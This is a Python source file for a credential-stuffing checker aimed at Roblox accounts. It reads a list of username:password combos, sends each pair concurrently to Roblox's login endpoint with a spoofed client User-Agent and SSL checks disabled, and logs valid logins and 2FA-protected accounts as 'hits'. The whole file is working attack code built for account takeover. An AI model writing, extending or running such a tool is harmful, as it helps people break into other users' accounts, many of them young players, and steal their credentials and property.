import aiohttp, asyncio, json, datetime, csv, os
from config import WORKERS, TIMEOUT

HEADERS = {
    "User-Agent": "Roblox/WinInet",
    "Content-Type": "application/json;charset=utf-8"
}

async def _check_one(session, combo: str, queue_out):
    user, pwd = combo.strip().split(":", 1)
    payload = {"ctype": "Username", "cvalue": user, "password": pwd}
    try:
        async with session.post(
            "https://auth.roblox.com/v2/login",
            json=payload,
            headers=HEADERS,
            timeout=TIMEOUT
        ) as r:
            txt = await r.text()
            if "User" in txt and "is valid" in txt:          # 200 capturado
                queue_out.put_nowait(f"[HIT] {user}:{pwd}")
                return True
            if "TwoStepRequired" in txt:                     # 2FA = hit tbm
                queue_out.put_nowait(f"[2FA] {user}:{pwd}")
                return True
    except Exception:
        pass
    return False

async def engine(file_path, queue_out):
    conn = aiohttp.TCPConnector(limit=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT+2)
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
        with open(file_path) as f:
            combos = [l for l in f if ":" in l]
        tasks = [asyncio.create_task(_check_one(s, c, queue_out))
                 for c in combos]
        for batch in _batches(tasks, WORKERS):
            await asyncio.gather(*batch, return_exceptions=True)

def _batches(it, n):
    for i in range(0, len(it), n):
        yield it[i:i+n]


